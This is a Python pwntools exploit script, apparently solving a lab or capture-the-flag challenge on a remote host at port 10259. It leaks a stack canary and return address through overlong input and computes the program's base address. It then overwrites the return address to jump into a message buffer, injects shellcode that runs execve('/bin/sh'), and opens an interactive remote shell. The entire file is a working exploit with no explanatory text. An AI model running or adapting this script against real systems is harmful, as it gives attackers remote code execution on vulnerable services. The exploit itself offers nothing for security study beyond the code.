#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'

exe = './shellcode'
port = 10259

# elf = ELF(exe)
# off_main = elf.symbols[b'main']
base = 0
qemu_base = 0

r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
elif 'qemu' in sys.argv[1:]:
    qemu_base = 0x4000000000
    r = process(f'qemu-x86_64-static {exe}', shell=True)
else:
    r = remote('up.zoolab.org', port)


shellcode = asm("""
    xor rax, rax           
    mov rbx, rax          

    push rbx               
    mov rdi, 0x68732f6e69622f 
    push rdi               
    mov rdi, rsp           
    push rbx               
    push rdi              
    mov rsi, rsp          

    push rbx              
    mov rdx, rsp          

    mov al, 59            
    syscall 
""")

r.recvuntil(b'name? ')
r.send(b'A'*41)

z = r.recvline()
canary = u64(z.split(b'A'*41)[1][0:7].rjust(8, b'\x00'))

r.recvuntil(b'number? ')
r.send(b'A'*56)

z = r.recvline()
return_addr = u64(z.split(b'A'*56)[1][:-1].ljust(8, b'\x00'))

main_offset = 0x8a67
task_offset = 0x8b07
msg_offset = 0xd31e0
offset = task_offset - main_offset

base_addr = return_addr - offset - main_offset
msg_addr = base_addr + msg_offset

new_ret_addr = p64(msg_addr)  
payloads = b'A' * 40 + p64(canary) + b'A'* 8 + new_ret_addr

r.recvuntil(b'name? ')
r.send(payloads)

r.recvuntil(b'message: ')
r.send(shellcode)

r.interactive()